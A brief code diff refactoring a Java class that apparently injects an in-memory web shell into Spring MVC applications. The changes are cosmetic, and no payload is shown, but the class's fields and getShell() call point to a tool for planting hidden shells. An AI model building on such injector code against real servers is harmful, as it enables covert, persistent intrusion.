@@ -15,7 +15,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class SpringWebMvcControllerHandlerInjector {
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -32,9 +32,7 @@ public class SpringWebMvcControllerHandlerInjector {
         } catch (Throwable e) {
           
         }
-        if (context == null) {
-            
-        } else {
+        if (context != null) {
             try {
                 Object shell = getShell();
                 
